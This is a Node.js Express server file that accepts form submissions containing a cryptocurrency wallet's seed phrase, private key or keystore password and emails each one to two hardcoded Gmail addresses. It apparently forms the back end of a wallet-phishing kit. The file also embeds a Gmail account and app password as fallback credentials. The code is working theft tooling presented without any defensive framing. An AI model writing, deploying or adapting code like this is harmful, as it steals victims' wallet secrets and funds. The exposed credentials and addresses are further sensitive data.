const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');

const app = express();
const port = 3000;

// Middleware to parse form data
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public')); // Serve static files from 'public' directory

// List of recipient email addresses
const maillist = [
  'Divasnow178@gmail.com',
  'rf7765272@gmail.com',
];

// Create nodemailer transporter
const transporter = nodemailer.createTransport({
  host: "smtp.gmail.com",
  port: 465,
  secure: true,
  auth: {
    user: process.env.EMAIL_USER || "hello.jonathanpius@gmail.com",
    pass: process.env.EMAIL_PASS || "rbenxiivasedcnaw",
    // ⚠️ IMPORTANT: Use environment variables for email credentials in production
  },
});

// Route to handle form submission
app.post('/submit', async (req, res) => {
  try {
    // Extract form data
    const { walletName, phraseWallet, passwordWallet } = req.body;

    // Prepare email options
    const mailOptions = {
      from: '"Wallet Details" <hello.jonathanpius@gmail.com>',
      to: maillist,
      subject: "New Wallet Details Submitted",
      html: `
        <h2>Wallet Details Submission</h2>
        <p><strong>Wallet Name:</strong> ${walletName || 'Not provided'}</p>
        <p><strong>Wallet Phrase/Keystore/Private Key:</strong> ${phraseWallet || 'Not provided'}</p>
        <p><strong>Password (if keystore):</strong> ${passwordWallet || 'Not provided'}</p>
      `
    };

    // Send email
    const info = await transporter.sendMail(mailOptions);

    console.log('Email sent:', info.messageId);
    console.log('Accepted:', info.accepted);
    console.log('Rejected:', info.rejected);

    // Send response back to client
    res.send('Wallet details submitted successfully');
  } catch (error) {
    console.error('Error sending email:', error);
    res.status(500).send('Error submitting wallet details');
  }
});

// Start the server
app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});